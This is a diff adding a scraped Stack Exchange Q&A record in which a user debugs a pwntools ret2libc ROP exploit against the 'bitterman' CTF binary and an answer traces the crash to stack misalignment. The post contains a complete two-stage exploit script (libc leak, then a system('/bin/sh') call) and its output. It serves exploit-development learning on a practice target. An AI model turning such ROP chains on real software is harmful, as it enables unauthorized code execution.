@@ -1,0 +1,53 @@
+{
+  "title": "Receiving \"Got EOF while reading in interactive\" after properly executing system(\"/bin/sh\") using pwntools",
+  "link": "https://reverseengineering.stackexchange.com/questions/21524/receiving-got-eof-while-reading-in-interactive-after-properly-executing-system",
+  "content": "I've followed some tutorials on writing a pwntools-based exploit for the bitterman ELF binary, used in a CTF competition. However, all my attempts fail with the message below, i.e. Got EOF while reading in interactive after having executed system(\"/bin/sh\") using a simple ROP chain:\n\n```\nnlykkei@ubuntu-dev:~$ python bitterman.py                                                │ 27 p.recvuntil('Thanks!  \n')\n[+] Starting local process './bitterman': pid 6244                                       │ 28 \n[+] puts@glibc: 0x7fcbdc453010                                                           │ 29 #puts_addr = p.recv()[:8].strip().ljust(8,\"\\x00\")\n[+] offset: 0x7fcbdc3d2000                                                               │ 30 puts_addr = p.recvuntil('  \n', timeout=60)[:-1].strip().ljust(8,\"\\x00\")\n[*] Switching to interactive mode                                                        │ 31 log.success('puts@glibc: {}'.format(hex(u64(puts_addr))))\n[*] Got EOF while reading in interactive                                                 │ 32 \n$                                                                                        │ 33 #Stage 2\n[*] Process './bitterman' stopped with exit code -11 (SIGSEGV) (pid 6244)                │ 34 libc_puts = 0x81010\n[*] Got EOF while sending in interactive \n\n```\nHaving traced the exploit using GDB, I can verify that system(\"/bin/sh\") gets executed with the clone syscall returning a valid child PID. However, after the clone syscall nothing really happens, and the parent process continue and crashes (bad return address).\n\nWhat could be the problem? I'd be grateful if any experienced exploit developer or CTF entusiast could spot the error.\n\nUpdate:\nI just rewrote the exploit to use execv front-end for execve syscall, and then everything works as expected! (a shell is spawned)\n\nsystem(..) works by forking a child using clone syscall, whereas execve replaces the entire process. Any idea why system(..) approach doesn't work?\n\nhttps://github.com/ctfs/write-ups-2015/blob/master/camp-ctf-2015/pwn/bitterman-300/bitterman\n\nhttps://www.youtube.com/watch?v=6S4A2nhHdWg\n\n```\nfrom pwn import *\n\n#context(terminal=['tmux', 'new-window'])\n\np = process('./bitterman')\n#p = gdb.debug('./bitterman', 'b main')\n\n#context(os='linux', arch='amd64')\n#context.log_level = 'DEBUG'\n\n# Stage 1\nmain = p64(0x4006ec) #0x400550\nplt_puts = p64(0x400520)\ngot_puts = p64(0x600c50)\npop_rdi = p64(0x400853)\n\njunk = 152*\"A\"\n\npayload = junk + pop_rdi + got_puts + plt_puts + main\n\np.recvuntil('name?')\np.sendline('nlykkei')\np.recvuntil('message:')\np.sendline('256')\np.recvuntil('text:')\np.sendline(payload)\np.recvuntil('Thanks!  \n')\n\n#puts_addr = p.recv()[:8].strip().ljust(8,\"\\x00\")\nputs_addr = p.recvuntil('  \n', timeout=60)[:-1].strip().ljust(8,\"\\x00\")\nlog.success('puts@glibc: {}'.format(hex(u64(puts_addr))))\n\n#Stage 2\nlibc_puts = 0x81010\nlibc_system = 0x50300\nlibc_sh = 0x1aae80\n\noffset = u64(puts_addr) - libc_puts\nlog.success('offset: {}'.format(hex(offset)))\n\nsystem_addr = p64(libc_system + offset)\nsh_addr = p64(libc_sh + offset)\n\npayload = junk + pop_rdi + sh_addr + system_addr\n\np.recvuntil('name?')\np.sendline('nlykkei')\np.recvuntil('message:')\np.sendline('256')\np.recvuntil('text:')\np.sendline(payload)\np.recvuntil('Thanks!')\n\np.clean()\np.interactive() \n\n```\n",
+  "votes": "3",
+  "answers": 1,
+  "views": "16k",
+  "tags": [
+    "exploit",
+    "x86-64",
+    "pwntools"
+  ],
+  "user": "Shuzheng",
+  "time": "Jun 21, 2019 at 7:22",
+  "comments": [
+    {
+      "user": "Stefan Chonov",
+      "text": "Did you find some solution of your problem? I asking because I have the same issue.",
+      "time": null
+    },
+    {
+      "user": "Shuzheng",
+      "text": "Yes, I used exec instead of system.",
+      "time": null
+    }
+  ],
+  "answers_data": [
+    {
+      "content": "I think you might have an alignment problem. Find the address of a ret-only gadget and try putting it in your second payload as follows:\n\n```\nret = p64(0x?????)\npayload = junk + ret + pop_rdi + sh_addr + system_addr\n\n```\nReferences:\n\n",
+      "votes": "3",
+      "user": "1chk0v",
+      "time": "Mar 12, 2021 at 22:50",
+      "is_accepted": false,
+      "comments": [
+        {
+          "user": "Shuzheng",
+          "text": "Do you have any idea why it works with exec and not system?",
+          "time": null
+        },
+        {
+          "user": "1chk0v",
+          "text": "Check this out: ropemporium.com/guide.html#Common%20pitfalls It seems that system uses movaps instruction that is picky about alignment. Exec might not have this issue.",
+          "time": null
+        },
+        {
+          "user": "Shuzheng",
+          "text": "Thanks. Just off-topic: Is ROP still viable given code is compiled with CFI? Or is it like studying stack execution (no DEP)?",
+          "time": null
+        }
+      ]
+    }
+  ]
+}
